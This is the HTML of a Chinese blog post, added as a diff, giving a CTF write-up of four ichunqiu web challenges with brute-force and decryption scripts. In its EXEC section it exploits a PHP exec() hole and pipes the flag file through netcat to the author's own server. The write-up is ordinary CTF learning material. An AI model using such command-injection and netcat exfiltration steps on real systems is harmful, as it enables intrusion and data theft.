@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="fuzzing刚开始登入界面，啥也没有，提示让我提供key的值，于是post一下。然后得到这么一句话，就是简单的爆破md5。附上爆破脚本：1234567891011121314151617#!/usr/bin/env python2# -*- coding: UTF-8 -*-import hashlibxxx=hashlib.md5()key=&amp;quot;ichunqiu&amp;quot;aaa=&amp;q">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu web部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/11/03/ichunqiuweb/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="fuzzing刚开始登入界面，啥也没有，提示让我提供key的值，于是post一下。然后得到这么一句话，就是简单的爆破md5。附上爆破脚本：1234567891011121314151617#!/usr/bin/env python2# -*- coding: UTF-8 -*-import hashlibxxx=hashlib.md5()key=&amp;quot;ichunqiu&amp;quot;aaa=&amp;q">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-8149f3870f19d392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7ae7b3a1765825df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-ecb7d9913e16aef1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-17c7d306fa71ebec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-596d0f54e9a07b2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b1f373905bbbbcb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-a04a2cb58cb87c01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-870d359318159a60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b9384aca7601e5b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d3f822e4f848c6b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-09T11:06:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ichunqiu web部分wp">
+<meta name="twitter:description" content="fuzzing刚开始登入界面，啥也没有，提示让我提供key的值，于是post一下。然后得到这么一句话，就是简单的爆破md5。附上爆破脚本：1234567891011121314151617#!/usr/bin/env python2# -*- coding: UTF-8 -*-import hashlibxxx=hashlib.md5()key=&amp;quot;ichunqiu&amp;quot;aaa=&amp;q">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-8149f3870f19d392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/03/ichunqiuweb/">
+
+
+
+
+
+  <title>ichunqiu web部分wp | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/03/ichunqiuweb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ichunqiu web部分wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-03T15:30:26+08:00">
+                2018-11-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="fuzzing"><a href="#fuzzing" class="headerlink" title="fuzzing"></a>fuzzing</h1><p>刚开始登入界面，啥也没有，提示让我提供key的值，于是post一下。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-8149f3870f19d392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-8149f3870f19d392.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后得到这么一句话，就是简单的爆破md5。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7ae7b3a1765825df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7ae7b3a1765825df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>附上爆破脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">xxx=hashlib.md5()</span><br><span class="line">key=&quot;ichunqiu&quot;</span><br><span class="line">aaa=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">for i in aaa:</span><br><span class="line">    for j in aaa:</span><br><span class="line">        for k in aaa:</span><br><span class="line">            str=key+i+j+k</span><br><span class="line">            # print(str)</span><br><span class="line">            xxx.update(str)</span><br><span class="line">            p=xxx.hexdigest()</span><br><span class="line">            # print(p)</span><br><span class="line">            if cmp(p,&quot;1b4167610ba3f2ac426a68488dbd89be&quot;)==0:</span><br><span class="line">                print(str)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></p>
+<p>得到爆破结果是ichunqiu105，然后post提交。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-ecb7d9913e16aef1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-ecb7d9913e16aef1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>给出了一个函数源码和flag的加密形式，我们phpstudy构建环境解密，只需要对源码进行一个小小的修改，解密代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line">	$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line">	$result = &apos;&apos;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for ($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line">	for ($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	for ($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125;</span><br><span class="line">	if ($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123;</span><br><span class="line">			return substr($result, 26);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return &apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return $keyc . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo authcode(&quot;4f6bcz9Zhl2jGIH9QLgP7NCEvzq+wpbVKYsOilqrHVS1TfQscmqxQAKzO/wPLTF4Zw5kvLY5usuWdN+5WGmgUBJaa2AIN3w&quot;,&apos;DECODE&apos;,&quot;ichunqiu105&quot;,0)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>后台运行，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-17c7d306fa71ebec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-17c7d306fa71ebec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h1><p>感觉这个题特别好，特意记录一下，刚开始查看页面发现啥也没有。最后在源码中看到了vim，猜测应该是文件泄露。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-596d0f54e9a07b2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-596d0f54e9a07b2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后访问.index.php.swp，果然下载了源码文件。linux下vim -r index.php.swp命令，恢复出来源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">flag in flag233.php</span><br><span class="line">*/</span><br><span class="line"> function check($number)</span><br><span class="line">&#123;</span><br><span class="line">        $one = ord(&apos;1&apos;);</span><br><span class="line">        $nine = ord(&apos;9&apos;);</span><br><span class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           return $number == &apos;11259375&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">	setcookie(&apos;auth&apos;,&apos;tcp tunnel is forbidden!&apos;);</span><br><span class="line">	if(isset($_POST[&apos;cmd&apos;]))&#123;</span><br><span class="line">		$command=$_POST[cmd];</span><br><span class="line">		$result=exec($command);</span><br><span class="line">		//echo $result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	die(&apos;no sign&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>第一步number好绕过，直接十六进制编码。0xabcdef即可。但是第二步的exec命令，由于echo被注释了。所以无法直接看回显。查看大佬的wp之后，发现直接用nc命令把flag文件下过来，我们需要一台有公网ip的服务器。我们在服务器上运行命令nc -l -u -p 12345(端口).<br>然后cmd=nc -u vps的ip 13245 &lt; flag233.php<br>即可得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b1f373905bbbbcb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b1f373905bbbbcb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h1><p>这个题非常有意思，特意记录一下。题目源码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">&apos;天下武功唯快不破&apos;;</span><br><span class="line">setcookie(&apos;token&apos;,&apos;hello&apos;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if ($_COOKIE[&apos;token&apos;]==&apos;hello&apos;)&#123;</span><br><span class="line">  $txt = file_get_contents(&apos;flag.php&apos;);</span><br><span class="line">  $filename = &apos;u/&apos;.md5(mt_rand(1,1000)).&apos;.txt&apos;;</span><br><span class="line">  file_put_contents($filename,$txt);</span><br><span class="line">  sleep(10);</span><br><span class="line">  unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>意思是根据mt_rand(1,1000)随机产生文件名，把flag的值传进去，然后10秒后删除文件。所以我们要提前做好文件名的字典。刷新完页面之后，赶紧用御剑跑一下。<br>字典生成脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">file = open(&quot;data.txt&quot;,&apos;w+&apos;)</span><br><span class="line">for i in range(1,1001):</span><br><span class="line">  m = hashlib.md5()</span><br><span class="line">  m.update(str(i).encode())</span><br><span class="line">  mid = m.hexdigest()</span><br><span class="line">  url = &apos;u/&apos;+mid+&apos;.txt&apos;</span><br><span class="line">  file.write(url+&apos;\n&apos;)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></p>
+<p>最后的结果为：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-a04a2cb58cb87c01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-a04a2cb58cb87c01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>访问这个url得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-870d359318159a60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-870d359318159a60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="象棋"><a href="#象棋" class="headerlink" title="象棋"></a>象棋</h1><p>这个题题意很明显，查看源码,发现一个正则：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b9384aca7601e5b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b9384aca7601e5b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>爆破js名字即可得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d3f822e4f848c6b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d3f822e4f848c6b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>爆破脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">x=&apos;abcmlyx&apos;</span><br><span class="line">y=&apos;0123456789&apos;</span><br><span class="line">url=&apos;http://334aa05c931741298b3dd521f596c7aade81deaba98947c2.game.ichunqiu.com/js/&apos;</span><br><span class="line">for a in x:</span><br><span class="line">    for b in x:</span><br><span class="line">        for c in y:</span><br><span class="line">            for d in y:</span><br><span class="line">                for e in y:</span><br><span class="line">                    turl=url+a+b+&apos;ctf&apos;+c+d+e+&apos;.js&apos;</span><br><span class="line">                    print turl</span><br><span class="line">                    s=requests.get(turl)</span><br><span class="line">                    if &quot;404&quot; not in s.content.decode(&apos;utf-8&apos;):</span><br><span class="line">                        print s.content.decode(&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/02/nctf/" rel="next" title="南邮ctf平台">
+                <i class="fa fa-chevron-left"></i> 南邮ctf平台
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/04/2018上海市大学生部分wp/" rel="prev" title="2018上海市大学生部分wp">
+                2018上海市大学生部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fuzzing"><span class="nav-number">1.</span> <span class="nav-text">fuzzing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EXEC"><span class="nav-number">2.</span> <span class="nav-text">EXEC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#时间"><span class="nav-number">3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#象棋"><span class="nav-number">4.</span> <span class="nav-text">象棋</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
